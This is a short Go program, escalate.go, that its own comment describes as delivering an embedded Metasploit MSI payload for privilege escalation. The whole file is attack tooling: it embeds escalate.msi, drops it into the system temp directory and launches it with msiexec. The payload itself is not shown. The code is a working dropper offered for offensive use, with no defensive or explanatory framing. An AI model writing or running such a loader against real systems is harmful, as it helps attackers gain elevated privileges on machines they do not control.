// escalate.go
package main

import (
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
)

// This program uses an embedded metasploit msi payload for
// privilege escalation purposes.

// Embed the escalate.msi file using the embed package
//
//go:embed escalate.msi
var msiFile []byte

func main() {
	// Create a temporary file to store the embedded MSI
	tempDir := os.TempDir()
	msiPath := filepath.Join(tempDir, "escalate.msi")

	// Write the embedded MSI file to the temporary file
	err := os.WriteFile(msiPath, msiFile, 0644)
	if err != nil {
		fmt.Printf("Failed to write MSI file: %v\n", err)
		return
	}
	fmt.Printf("MSI file written to: %s\n", msiPath)

	// Run msiexec to execute the MSI file
	cmd := exec.Command("msiexec", "/i", msiPath)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	// Execute the command and check for errors
	err = cmd.Run()
	if err != nil {
		fmt.Printf("Failed to run msiexec: %v\n", err)
		return
	}

	fmt.Println("MSI executed successfully.")
}
